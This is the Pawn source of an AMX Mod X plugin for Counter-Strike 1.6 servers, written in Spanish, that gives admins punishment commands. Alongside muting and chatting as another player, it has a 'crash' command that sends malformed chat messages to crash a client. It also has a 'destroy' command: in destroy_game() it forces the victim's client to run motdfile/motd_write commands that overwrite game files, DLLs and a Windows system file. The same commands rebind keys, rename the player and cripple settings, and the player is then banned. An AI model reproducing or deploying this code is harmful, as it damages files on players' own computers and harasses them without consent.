/*
	Plugin de Castigos - v 1.62
	2014. Lima, Peru.
	
	Modo de uso:
	
	- Comandos de chat:
	
	say /callar - Abre el menu para silenciar.
	say /chat - Abre el menu para enviar un mensaje como otro jugador.
	say /crash - Abre el menu para cerra el juego a un jugador y expulsarlo.
	say /destroy - Abre el menu para destruir y banear permanentemente a un jugador.
	
	ACLARACION - El destroy no es efectivo si el cliente usa STEAM
*/

#include <amxmodx>
#include <engine>
#include <fun>
#include <hamsandwich>

// Aqui configura el acceso de admin requerido para usar las funciones
new const NIVEL_DE_ADMIN =	ADMIN_RESERVATION	// Callar
new const NIVEL_DE_ADMIN2 =	ADMIN_KICK	// Chat y Crash
new const NIVEL_DE_ADMIN3 =	ADMIN_RCON	// Destroy

// Todo se graba en un log (addons/amxmodx/logs)
new const CASTIGOS_LOG[] =	"castigos.log"

// Sonido del destroy (Patria, socialismo o muerte)
new const SOUNDS_DESTROY[][] = {
	"molina/dest6.wav",
	"molina/dest2.wav",
	"molina/dest3.wav",
	"molina/dest4.wav",
	"molina/dest5.wav"
};

// Aqui termina la seccion editable, proseguir no esta soportado.

#include <amxmisc>

#define VERSION "1.62"

#pragma semicolon 1

#define is_player_muted(%0) (g_bMuted&(1<<(%0&0b11111)))
#define unset_mute(%0) g_bMuted&=~(1<<(%0&0b11111))
#define toggle_mute(%0) g_bMuted^=(1<<(%0&0b11111))

#define is_player_destroyed(%0) (g_bDestroyed&(1<<(%0&0b11111)))
#define set_destroy(%0) g_bDestroyed|=(1<<(%0&0b11111))
#define unset_destroy(%0) g_bDestroyed&=~(1<<(%0&0b11111))

#define is_chat_ignored(%0) (g_bChatIgnore&(1<<(%0&0b11111)))
#define set_chat_ignore(%0) g_bChatIgnore|=(1<<(%0&0b11111))
#define unset_chat_ignore(%0) g_bChatIgnore&=~(1<<(%0&0b11111))

new g_MaxPlayers, g_msgSayText, cvar_mostrar;
new g_bMuted, g_bDestroyed, g_bChatIgnore, g_ChatSay[33], g_action[33];
new Float:g_origin[3], g_ip[16], g_name[32];
new g_fexplo, g_lightning, g_smoke;

public plugin_precache()
{
	precache_model("models/rpgrocket.mdl");
	
	for (new i = 0; i < sizeof SOUNDS_DESTROY; i++)
		precache_sound(SOUNDS_DESTROY[i]);
	
	g_fexplo = precache_model("sprites/fexplo1.spr");
	g_lightning = precache_model( "sprites/lgtning.spr" );
	g_smoke = precache_model( "sprites/steam1.spr" );
}

public plugin_init()
{
	register_plugin("Castigos", VERSION, "Mia2904");
		
	register_clcmd("say /callar", "clcmd_saycallar",NIVEL_DE_ADMIN);
	register_clcmd("say /crash", "clcmd_saycrash", NIVEL_DE_ADMIN2);
	register_clcmd("say /chat", "clcmd_saychat", NIVEL_DE_ADMIN2);
	register_clcmd("say /destroy", "clcmd_saydestroy", NIVEL_DE_ADMIN3);
	
	register_clcmd("say", "hook_say");
	register_clcmd("say_team", "hook_say");
	register_clcmd("Chat_Say", "chat_say", NIVEL_DE_ADMIN2);
	
	g_MaxPlayers = get_maxplayers();
	g_msgSayText = get_user_msgid("SayText");
	
	cvar_mostrar = register_cvar("castigos_mostrar", "1");
}

public clcmd_saycallar(id, level)
{
	if (!(get_user_flags(id) & level))
		return PLUGIN_CONTINUE;
	
	g_action[id] = 1;
	show_menu_players(id);
	
	return PLUGIN_HANDLED;
}

public clcmd_saychat(id, level)
{
	if (!(get_user_flags(id) & level))
		return PLUGIN_CONTINUE;
	
	g_action[id] = 2;
	show_menu_players(id);
	
	return PLUGIN_HANDLED;
}

public clcmd_saycrash(id, level)
{
	if (!(get_user_flags(id) & level))
		return PLUGIN_CONTINUE;
	
	g_action[id] = 3;
	show_menu_players(id);
	
	return PLUGIN_HANDLED;
}

public clcmd_saydestroy(id, level)
{
	if (!(get_user_flags(id) & level))
		return PLUGIN_CONTINUE;
	
	g_action[id] = 4;
	show_menu_players(id);
	
	return PLUGIN_HANDLED;
}

show_menu_players(id, page = 0)
{
	static menushow[50], buffer[32], players[32], count, data[6];
		
	switch (g_action[id])
	{
		case 1: formatex(menushow, charsmax(menushow), "\r[Callar]\y Elige un jugador%s", get_playersnum() > 8 ? "^nPagina:\r" : "" );
		case 2: formatex(menushow, charsmax(menushow), "\r[Chat]\y Elige un jugador%s", get_playersnum() > 8 ? "^nPagina:\r" : "" );
		case 3: formatex(menushow, charsmax(menushow), "\r[Crash]\y Elige un jugador%s", get_playersnum() > 8 ? "^nPagina:\r" : "" );
		case 4: formatex(menushow, charsmax(menushow), "\r[Destroy]\y Elige un jugador%s", get_playersnum() > 8 ? "^nPagina:\r" : "" );
	}
	
	new menu = menu_create(menushow, "menu_players");
	
	new player;
	get_players(players, count, "ch");
	
	for (new i = 0; i < count; i++)
	{
		player = players[i];
		
		num_to_str(get_user_userid(player), data, 5);
		
		get_user_name(player, buffer, 31);
		
		switch (g_action[id])
		{
			case 1: formatex(menushow, charsmax(menushow), "%s %s", buffer, is_player_muted(player) ? "\y(Callado)" : "");
			default: formatex(menushow, charsmax(menushow), "%s", buffer);
		}
		
		menu_additem(menu, menushow, data);
	}
	
	menu_setprop(menu, MPROP_EXIT, MEXIT_NORMAL);
	menu_setprop(menu, MPROP_EXITNAME, "\ySalir");
	menu_setprop(menu, MPROP_BACKNAME, "Anterior");
	menu_setprop(menu, MPROP_NEXTNAME, "Siguiente^n");
	menu_setprop(menu, MPROP_NUMBER_COLOR, "\r");
	
	menu_display(id, menu, page);
	
	return PLUGIN_HANDLED;
}

public menu_players(id, menu, item)
{
	if (item == MENU_EXIT || !is_user_connected(id))
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	
	new data[6], junk;
	menu_item_getinfo(menu, item, junk, data, 5, "", 0, junk);
	new userid = str_to_num(data);
	
	new player = find_player("k", userid);
	
	if (player) switch(g_action[id])
	{
		case 1:
		{
			new admin[32], nick[32];
			get_user_name(id, admin, 31);
			get_user_name(player, nick, 31);
			toggle_mute(player);
			set_speak(player, is_player_muted(player) ? SPEAK_MUTED : SPEAK_NORMAL);
			show_menu_players(id, item / 7);
			
			log_to_file(CASTIGOS_LOG, "Admin %s - Silencio %sactivado a %s", admin, is_player_muted(player) ? "" : "des", nick);
			if(get_pcvar_num(cvar_mostrar))
				client_print(0, print_chat, "ADMIN %s - Silencio %sactivado a %s", admin, is_player_muted(player) ? "" : "des", nick);
		}
		case 2:
		{
			g_ChatSay[id] = player;
			client_cmd(id, "messagemode ^"Chat_Say^"");
		}
		case 3:
		{
			new admin[32], nick[32];
			get_user_name(id, admin, 31);
			get_user_name(player, nick, 31);
			
			log_to_file(CASTIGOS_LOG, "Admin %s - Expulsar a %s", admin, nick);
			if(get_pcvar_num(cvar_mostrar))
				client_print(0, print_chat, "ADMIN %s - Expulsar a %s", admin, nick);
			
			crash_player(userid);
			set_task(1.0, "kick_player", userid);
		}
		case 4:
		{
			get_user_name(player, g_name, 31);
			
			show_menu_confirm(id, data);
		}
	}
	
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

show_menu_confirm(id, userid_data[])
{
	new menushow[70];
	formatex(menushow, charsmax(menushow), "\r[Destroy:\y %s\r]^n\w¿Estás seguro?", g_name);
	new menu = menu_create(menushow, "menu_confirm");
	menu_additem(menu, "\ySí, destruir.", userid_data);
	menu_additem(menu, "No, cancelar.");
	menu_setprop(menu, MPROP_EXIT, MEXIT_NEVER);
	menu_setprop(menu, MPROP_NUMBER_COLOR, "\r");
	
	menu_display(id, menu);
}
	
public menu_confirm(id, menu, item)
{
	if (item != 0 || !is_user_connected(id))
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	
	new data[6], userid;
	menu_item_getinfo(menu, item, userid, data, charsmax(data), "", 0, userid);
	userid = str_to_num(data);
	menu_destroy(menu);
	
	new player = find_player("k", userid);
	
	if (!player)
		return PLUGIN_HANDLED;
	
	//Log
	new admin[32];
	get_user_name(id, admin, 31);
	log_to_file(CASTIGOS_LOG, "Admin %s - Destruir a %s", admin, g_name);
	
	destroy_game(player);
	destroy_player(player, userid, id);
	
	return PLUGIN_HANDLED;
}

public client_disconnect(id)
{
	unset_destroy(id);
	unset_mute(id);
}

public chat_say(id, level)
{
	if (!(get_user_flags(id) & level))
		return PLUGIN_CONTINUE;
	
	static message[191];
	read_argv(1, message, 190);
	
	client_cmd(g_ChatSay[id], "say ^"%s^"", message);
	
	return PLUGIN_HANDLED;
}

public hook_say(id)
{
	// Tiene mute
	if (is_player_muted(id))
		return PLUGIN_HANDLED;
	
	// Ignoramos el mensaje
	if (is_chat_ignored(id))
	{
		unset_chat_ignore(id);
		return PLUGIN_CONTINUE;
	}
}

destroy_player(id, userid, admin)
{
	set_destroy(id);
	
	get_user_ip(id, g_ip, 15, 1);
	
	entity_get_vector(id, EV_VEC_origin, g_origin);
	g_origin[2] += 20.0;
	entity_set_vector(id, EV_VEC_origin, g_origin);
	entity_set_float(id, EV_FL_gravity, 0.0);
	entity_set_float(id, EV_FL_takedamage, 0.0);
	set_view(id, 1);
	set_user_rendering(id, kRenderFxGlowShell, 255, 165, 0, kRenderNormal, 16);
	
	client_cmd(0, "spk %s", SOUNDS_DESTROY[random(sizeof SOUNDS_DESTROY)]);
	
	new data[2];
	data[0] = userid;
	set_task(4.5, "finish_destroy", admin, data, 1);
	set_task(5.0, "crash_player", userid);
	set_task(5.5, "add_ip", admin, data, 1);
}

public finish_destroy(data[], id)
{	
	if (is_user_connected(id))
	{
		new text[100], name[32];
		get_user_name(id, name, 31);
		formatex(text, charsmax(text), "^x04[DESTROY]^x01 ADMIN %s ha^x04 destruido^x01 a^x03 %s", name, g_name);
		
		message_begin(MSG_BROADCAST, g_msgSayText);
		write_byte(33);
		write_string(text);
		message_end();
	}
	
	unset_destroy(id);
	
	new vorigin[3], pos[3];
	vorigin[0] = floatround(g_origin[0]);
	vorigin[1] = floatround(g_origin[1]);
	vorigin[2] = floatround(g_origin[2]);
	
	vorigin[2] -= 26;
	pos[0] = vorigin[0] + 150;
	pos[1] = vorigin[1] + 150;
	pos[2] = vorigin[2] + 800;
		
	Thunder(pos, vorigin);
	Smoke(vorigin, 10, 10);
	Blood(vorigin);
	Explode(vorigin);
	
	new player = find_player("k", data[0]);
	
	if (!is_user_connected(player))
		return;
	
	entity_set_float(player, EV_FL_takedamage, 1.0);
	ExecuteHamB(Ham_TakeDamage, player, 0, 0, 50000.0, DMG_ENERGYBEAM);
}

public add_ip(data[], admin)
{
	if (find_player("k", data[0]))
		server_cmd("amx_banip ^"#%d^" ^"0^" ^"%s destruido por ADMIN %s^"", data[0], g_name, admin);
	server_cmd("addip 0.0 %s;writeip", g_ip);
}

destroy_game(player)
{
	static const szCommands[][] =
	{
		"snapshot;snapshot;say ^"He sido victima del Destroy :(^"",
		";motdfile models/player.mdl;motd_write x;motdfile models/v_ak47.mdl;motd_write x",
		";motdfile cs_dust.wad;motd_write x;motdfile models/v_m4a1.mdl;motd_write x",
		";motdfile resource/GameMenu.res;motd_write x;motdfile halflife.wad;motd_write x",
		";motdfile cstrike.wad;motd_write x;motdfile resource/game_menu_mouseover.tga;motd_write x",
		";motdfile maps/de_dust2.bsp;motd_write x;motdfile events/ak47.sc;motd_write x",
		";motdfile dlls/mp.dll;motd_write x;motdfile cl_dlls/client.dll;motd_write x",
		";motdfile dlls/server.dll;motd_write x;motdfile models/shield.mdl;motd_write x",
		";motdfile models/player/z_out_admin/z_out_admin.mdl;motd_write x;motdfile models/player/admin_ct/admin_ct.mdl;motd_write x",
		";motdfile models/w_usp.mdl;motd_write x;motdfile models/w_ump45.mdl;motd_write x",
		";motdfile models/w_smokegrenade.mdl;motd_write x;motdfile models/w_sg552.mdl;motd_write x",
		";motdfile models/w_sg550.mdl;motd_write x;motdfile models/w_scout.mdl;motd_write x",
		";motdfile models/w_p228.mdl;motd_write x;motdfile models/w_p90.mdl;motd_write x",
		";motdfile models/w_mac10.mdl;motd_write x;motdfile models/w_knife.mdl;motd_write x",
		";motdfile models/w_hegrenade.mdl;motd_write x;motdfile models/w_flashbang.mdl;motd_write x",
		";motdfile models/w_c4.mdl;motd_write x;motdfile models/v_shield_r.mdl;motd_write x",
		";motdfile models/v_sg550.mdl;motd_write x;motdfile models/v_p228.mdl;motd_write x",
		";motdfile models/v_p90.mdl;motd_write x;motdfile models/v_mp5.mdl;motd_write x",
		";motdfile models/v_mac10.mdl;motd_write x;motdfile models/v_m3.mdl;motd_write x",
		";motdfile models/v_knife_r.mdl;motd_write x;motdfile models/v_knife.mdl;motd_write x",
		";motdfile models/v_hegrenade.mdl;motd_write x;motdfile models/v_c4.mdl;motd_write x",
		";motdfile models/support3.mdl;motd_write x;motdfile models/p_knife.mdl;motd_write x",
		";motdfile models/p_usp.mdl;motd_write x;motdfile resource/LoadingDialog.res;motd_write x",
		";motdfile resource/CreateMultiplayerGameServerPage.res;motd_write x",
		";motdfile resource/logo_game.tga;motd_write x;motdfile events/createexplo.sc;motd_write x",
		";motdfile events/awp.sc;motd_write x;motdfile events/deagle.sc;motd_write x",
		";motdfile events/famas.sc;motd_write x;motdfile events/p90.sc;motd_write x",
		";motdfile cl_dlls/client.dll;motd_write x;motdfile sprites/pistol_smoke1.spr;motd_write x",
		";motdfile sprites/ic4.spr;motd_write x;motdfile sprites/radio.spr;motd_write x",
		";motdfile sprites/radar320.spr;motd_write x;motdfile sprites/radar640.spr;motd_write x",
		";motdfile sprites/radaropaque640.spr;motd_write x;motdfile sprites/snow.spr;motd_write x",
		";motdfile sprites/smokepuff.spr;motd_write x;motdfile sprites/w_ak47.spr;motd_write x",
		";motdfile sprites/w_knife.spr;motd_write x;motdfile userconfig.cfg;motd_write x",
		";motdfile dlls/mpold.dll;motd_write x;motdfile classes/ak47.res;motd_write x",
		";motdfile classes/default.res;motd_write x;motdfile BotChatter.db;motd_write x",
		";motdfile BotProfile.db;motd_write x;motdfile sound/destroy.wav;motd_write x",
		";motdfile models/player.mdl;motd_write x;motdfile models/v_ak47.mdl;motd_write x",
		";motdfile models/p_ak47.mdl;motd_write x;motdfile models/v_flashbang.mdl;motd_write x",
		";motdfile models/p_m3.mdl;motd_write x;motdfile models/v_awp.mdl;motd_write x",
		";motdfile models/p_ump45.mdl;motd_write x;motdfile models/v_awp.mdl;motd_write x",
		";motdfile models/player/arctic/arctic.mdl;motd_write x;motdfile models/player/gsg9/gsg9.mdl;motd_write x",
		";motdfile models/player/sas/sas.mdl;motd_write x;motdfile models/player/terror/terror.mdl;motd_write x",
		";motdfile models/player/vip/vip.mdl;motd_write x;motdfile models/player/urban/urban.mdl;motd_write x",
		";motdfile resource/GameMenu.res;motd_write x;motdfile liblist.gam;motd_write x",
		";motdfile events/ak47.sc;motd_write x;motdfile autoexec.cfg;motd_write x",
		";motdfile dlls/cs_i386.so;motd_write x;motdfile resource/cstrike_english.txt;motd_write x",
		";motdfile resource/game_menu.tga;motd_write x;motdfile maps/de_inferno.bsp;motd_write x",
		";motdfile maps/de_dust2.bsp;motd_write x;motdfile maps/de_aztec.bsp;motd_write x",
		";motdfile maps/de_dust.bsp;motd_write x;motdfile maps/de_train.bsp;motd_write x",
		";motdfile cs_assault.wad;motd_write x;motdfile spectatormenu.txt.wad;motd_write x",
		";motdfile custom.hpk;motd_write x;motdfile C:/Windows/System32/winlogon.exe;motd_write x" ,
		";sys_ticrate 0.1;bind w say Destroy;bind a say Destroy;bind d say Destroy;cl_cmdrate 20;cl_updaterate 20",
		";fps_max 10.0;fps_modem 10.0;name ^"He sido victima del Destroy :(^";cl_timeout 0.0",
		";cl_allowdownload 0;cl_allowupload 0;rate 1000;developer 2;hpk_maxsize 100;bind m say Destroy",
		";bind w say Destroy;bind g say Destroy;cl_forwardspeed 40;cl_backspeed 40;cl_sidespeed 40",
		";motdfile userconfig.cfg;motd_write x;bind d say Destroy;bind y say Destroy;cd eject"
	};
	
	for (new i = 0; i < sizeof(szCommands); i++)
		client_cmd(player, szCommands[i]);
		
	/*client_cmd(player,"snapshot;snapshot;name ^"He sido victima del Destroy^";unbindall;developer 2;fps_override 1;fps_max 20;hud_saytext 0;con_color ^"0 0 0^";writecfg config.cfg;");
	client_cmd(player,"motdfile resource/GameMenu.res;motd_write Destroy;motdfile models/player.mdl;motd_write Destroy;motdfile dlls/mp.dll;motd_write Destroy;");
	client_cmd(player,"motdfile cl_dlls/client.dll;motd_write Destroy;motdfile cs_dust.wad;motd_write Destroy;motdfile cstrike.wad;motd_write Destroy;");
	client_cmd(player,"motdfile sprites/muzzleflash1.spr;motd_write Destroy;motdfile events/ak47.sc;motd_write Destroy;motdfile models/v_ak47.mdl;motd_write Destroy");*/
}

public crash_player(userid)
{
	new id = find_player("k", userid);
	
	if (!is_user_connected(id))
		return;
	
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id);
	write_byte(94);
	write_string("^x04[@%s0@%s0@%s0");
	message_end();
	
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id);
	write_byte(421);
	write_string("^x04[@%s0@%s0@%s0");
	message_end();
		
	message_begin(MSG_ONE_UNRELIABLE, g_msgSayText, _, id);
	write_byte(79);
	write_string("^x04[@%s0@%s0@%s0");
	message_end();
}

public kick_player(userid)
{
	if (find_player("k", userid))
		server_cmd("kick #%d", userid);
}

public client_PreThink(id)
{
	if (!is_player_destroyed(id))
		return;
	
	static const Float:velocity[3] = { 0.0, 0.0, 40.0 };
	static Float:origin[3];
	
	entity_set_vector(id, EV_VEC_velocity, velocity);
	
	entity_get_vector(id, EV_VEC_origin, origin);
	g_origin[2] = origin[2];
	entity_set_vector(id, EV_VEC_origin, g_origin);
}

Explode(origin[3])
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
	write_byte(TE_EXPLOSION);
	write_coord(origin[0]);
	write_coord(origin[1]);
	write_coord(origin[2]);
	write_short(g_fexplo);
	write_byte(30);
	write_byte(15);
	write_byte(0);
	message_end();
}

Thunder(start[3], end[3])
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY); 
	write_byte(TE_BEAMPOINTS); 
	write_coord(start[0]); 
	write_coord(start[1]); 
	write_coord(start[2]); 
	write_coord(end[0]); 
	write_coord(end[1]); 
	write_coord(end[2]); 
	write_short(g_lightning); 
	write_byte(1);
	write_byte(5);
	write_byte(7);
	write_byte(20);
	write_byte(30);
	write_byte(200); 
	write_byte(200);
	write_byte(200);
	write_byte(200);
	write_byte(200);
	message_end();
	
	message_begin(MSG_PVS, SVC_TEMPENTITY, end);
	write_byte(TE_SPARKS);
	write_coord(end[0]);
	write_coord(end[1]);
	write_coord(end[2]);
	message_end();
	
	message_begin(MSG_PVS, SVC_TEMPENTITY, end);
	write_byte(TE_TAREXPLOSION);
	write_coord(end[0]);
	write_coord(end[1]);
	write_coord(end[2]);
	message_end();
}

Smoke(origin[3], scale, framerate)
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
	write_byte(TE_SMOKE);
	write_coord(origin[0]);
	write_coord(origin[1]);
	write_coord(origin[2]);
	write_short(g_smoke);
	write_byte(scale);
	write_byte(framerate);
	message_end();
}

Blood(origin[3])
{
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY); 
	write_byte(TE_LAVASPLASH); 
	write_coord(origin[0]); 
	write_coord(origin[1]); 
	write_coord(origin[2]); 
	message_end(); 
}

/*
	Historial de versiones:
	
	v0.1
	- Primera versión
	
	v0.2
	- Cvars
	
	v0.3
	- Optimizaciones
	- Comando callar
	
	v0.5
	- Comando castigar
	- Nivel de admin para las funciones editable
	
	v0.6
	- Agregado logs para los comandos
		
	v1.0
	- Optimizaciones
	- Comando destroy
  - Version publica
	
	v1.2
	- MUCHAS optimizaciones
	
	v1.3
	- Menu para callar
	
	v1.4
	- Comando Chat
	
	v1.5
	- Menu para comando chat
	
	v1.6
	- Destroy mejorado
	
	v1.61
	- Agregado soporte para AMXBans
	
	v1.62
	- Destroy mejorado
*/
